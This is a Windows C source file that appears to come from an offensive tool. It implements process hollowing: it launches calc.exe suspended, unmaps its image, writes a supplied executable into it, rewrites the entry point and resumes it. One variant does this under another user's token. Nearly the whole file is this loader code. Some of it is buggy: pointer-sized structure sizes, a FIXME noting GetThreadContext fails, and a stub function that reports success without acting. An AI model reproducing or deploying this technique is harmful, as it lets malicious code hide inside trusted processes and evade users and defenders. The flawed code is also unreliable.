#include "stdafx.h"
#include "launchprocess.h"

void WINAPI setDefaultStartupInfo(STARTUPINFO * si)
{
	si->cb = sizeof(si);
	si->lpReserved = NULL;
	si->lpDesktop = NULL; // Inherit the caller's one
	si->lpTitle = NULL; // = default
	si->dwX = 0;	// position x or newly created windows
	si->dwY = 0;	// position y
	si->dwXSize = 120;	// size x
	si->dwYSize = 120;	// size y
	si->dwXCountChars = 120;	// Nb of chars in x ? to test
	si->dwYCountChars = 120;	// Nb of chars in y ? to test
	si->dwFillAttribute = FOREGROUND_BLUE | FOREGROUND_GREEN | FOREGROUND_RED; // White text on black background
	si->dwFlags = STARTF_USESHOWWINDOW; // use wShowWindow
	si->wShowWindow = SW_SHOW; // More info, see ShowWindow()
	si->cbReserved2 = 0;	// Must be 0
	si->lpReserved2 = NULL;	// Must be NULL
	si->hStdInput = NULL;	// Default is stdin
	si->hStdOutput = NULL;	// Default is stdout
	si->hStdError = NULL;	// Default is stderr
}

BOOL WINAPI launchProcWithTokenW(Token * token, LPCTSTR prog)
{
	BOOL bResult = FALSE;

	if (token == NULL)
	{
		SetLastError(ERROR_BAD_ARGUMENTS);
		return bResult;
	}

	bResult = TRUE;
	return bResult;
}

static ULONG protect(ULONG characteristics)
{
	static const ULONG mapping[] = { PAGE_NOACCESS, PAGE_EXECUTE, PAGE_READONLY, PAGE_EXECUTE_READ,
		PAGE_READWRITE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE, PAGE_EXECUTE_READWRITE };

	return mapping[characteristics >> 29];
}

BOOL WINAPI mapProcessMem(const unsigned char * readProc)
{
	typedef LONG(NTAPI * pfnZwUnmapViewOfSection)(HANDLE, PVOID);
	HMODULE hMod = GetModuleHandle(L"ntdll.dll");
	pfnZwUnmapViewOfSection pZwUnmapViewOfSection = (pfnZwUnmapViewOfSection)GetProcAddress(hMod, "ZwUnmapViewOfSection");

	BOOL bResult = FALSE;

	ULONG i = 0;

	PROCESS_INFORMATION pi = { 0 };
	STARTUPINFO si = { 0 };
	CONTEXT context = { CONTEXT_INTEGER };
	PVOID memBuff = NULL;
	//PVOID readProc = NULL;
	PVOID q = NULL;

	IMAGE_DOS_HEADER * dos = NULL;
	IMAGE_NT_HEADERS * nt = NULL;
	IMAGE_SECTION_HEADER * sect = NULL;

	LPWSTR cmdLine = L"C:\\Windows\\System32\\calc.exe";

	setDefaultStartupInfo(&si);

	CreateProcessW(cmdLine, 0, 0, 0, FALSE, CREATE_NEW_CONSOLE | CREATE_SUSPENDED, 0, 0, &si, &pi);
	GetThreadContext(pi.hThread, &context);

	ReadProcessMemory(pi.hProcess, (PDWORD)(context.Ebx) + 8, &memBuff, sizeof memBuff, 0);

	pZwUnmapViewOfSection(pi.hProcess, memBuff);

	//readProc = LockResource(LoadResource(0, FindResourceW(0, L"Image", L"EXE"))); 

	dos = (IMAGE_DOS_HEADER *)readProc;
	nt = (IMAGE_NT_HEADERS *)((BYTE *)readProc + dos->e_lfanew);

	q = VirtualAllocEx(pi.hProcess,
		(PDWORD)nt->OptionalHeader.ImageBase,
		nt->OptionalHeader.SizeOfImage,
		MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE
	);

	WriteProcessMemory(pi.hProcess, q, readProc, nt->OptionalHeader.SizeOfHeaders, 0);

	sect = IMAGE_FIRST_SECTION(nt);

	for (i = 0; i < nt->FileHeader.NumberOfSections; i++)
	{
		WriteProcessMemory(pi.hProcess,
			(char *)q + sect[i].VirtualAddress,
			(char *)readProc + sect[i].PointerToRawData,
			sect[i].SizeOfRawData, 0
		);
		ULONG x;

		VirtualProtectEx(pi.hProcess, (char *)q + sect[i].VirtualAddress, sect[i].Misc.VirtualSize,
			protect(sect[i].Characteristics), &x
		);
	}

	WriteProcessMemory(pi.hProcess, (char *)context.Ebx + 8, &q, sizeof q, 0);

	context.Eax = (ULONG)q + nt->OptionalHeader.AddressOfEntryPoint;

	SetThreadContext(pi.hThread, &context);

	ResumeThread(pi.hThread);

	bResult = TRUE;
	return bResult;
}

BOOL WINAPI mapPeWithTokenW(Token * token, HANDLE image)
{
	BOOL bResult = FALSE;
	IMAGE_DOS_HEADER * DOSHeader = NULL; // For DOS PE Header symbols
	IMAGE_NT_HEADERS * NtHeader = NULL; // For NT PE Header symbols & objects
	IMAGE_SECTION_HEADER * SectionHeader = NULL;

	CONTEXT * CTX = NULL;

	PROCESS_INFORMATION pi;
	STARTUPINFOW si = { 0 };

	DWORD * ImageBase = NULL; // Base address of the image
	void * pImageBase = NULL; // Pointer to the image base

	int count = 0;

	DOSHeader = (PIMAGE_DOS_HEADER)image;
	NtHeader = (PIMAGE_NT_HEADERS)((DWORD)(image)+DOSHeader->e_lfanew);

	if (NtHeader->Signature == IMAGE_NT_SIGNATURE) // Check if image is a PE file
	{
		ZeroMemory(&pi, sizeof(pi));
		ZeroMemory(&si, sizeof(si));
		//setDefaultStartupInfo(&si);

		if (CreateProcessWithTokenW(token->hPrimaryToken, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\calc.exe",
			NULL, /*CREATE_NEW_CONSOLE |*/ CREATE_SUSPENDED, NULL, NULL, &si, &pi)) // Create a new instance of current process in suspended state, for the new image
		{
			WPRINTD_SUCCESS(L"[launchprocess.c] mapProcessWithTokenW. CreateProcessWithTokenW - SUCCESS\n");
			// Allocate memory for the context
			CTX = (LPCONTEXT)(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
			CTX->ContextFlags = CONTEXT_FULL; // Context is allocated

											  // NEXT CALL FAILS WITH ERROR 87, 0x57, "ERROR_INVALID_PARAMETER" !!!!!!!!!!!!!!!!!!!!!!!!!!!! FIX ME !!!!!!!!!!!!!!!!!!!!!!!!!
			if (GetThreadContext(pi.hThread, (LPCONTEXT)CTX)) // if context is in thread
			{
				WPRINTD_SUCCESS(L"[launchprocess.c] mapProcessWithTokenW. GetThreadContext - SUCCESS\n");
				// Read instructions
				ReadProcessMemory(pi.hProcess, (LPCVOID)(CTX->Ebx + 8), (LPVOID)&ImageBase, 4, 0);

				pImageBase = VirtualAllocEx(pi.hProcess, (LPVOID)NtHeader->OptionalHeader.ImageBase,
					NtHeader->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);

				// Write the image to the process
				WriteProcessMemory(pi.hProcess, pImageBase, image, NtHeader->OptionalHeader.SizeOfHeaders, NULL);

				for (count = 0; count < NtHeader->FileHeader.NumberOfSections; count++)
				{
					SectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)image + DOSHeader->e_lfanew + 248 + (count * 40));
					/*
					WriteProcessMemory(pi.hProcess, LPVOID(DWORD(pImageBase) + SectionHeader->VirtualAddress),
					LPVOID(DWORD(image) + SectionHeader->PointerToRawData), SectionHeader->SizeOfRawData, 0);
					*/
					WriteProcessMemory(pi.hProcess, (LPVOID)((DWORD)pImageBase + SectionHeader->VirtualAddress),
						(LPVOID)((DWORD)image + SectionHeader->PointerToRawData), SectionHeader->SizeOfRawData, 0);
				}
				WriteProcessMemory(pi.hProcess, (LPVOID)(CTX->Ebx + 8),
					(LPVOID)&NtHeader->OptionalHeader.ImageBase, 4, 0);

				// Move address of entre point to the eax register
				CTX->Eax = (DWORD)(pImageBase)+NtHeader->OptionalHeader.AddressOfEntryPoint;
				SetThreadContext(pi.hThread, (LPCONTEXT)CTX); // Set the context
				ResumeThread(pi.hThread); // Start the process / call main

				bResult = TRUE;
			}
			else
				WPRINTD_ERROR(L"[launchprocess.c] mapProcessWithTokenW. GetThreadContext - FAIL\n", GetLastError());
		}
		else
			WPRINTD_ERROR(L"[launchprocess.c] mapProcessWithTokenW. CreateProcessWithTokenW - FAIL\n", GetLastError());
	}
	return bResult;
}
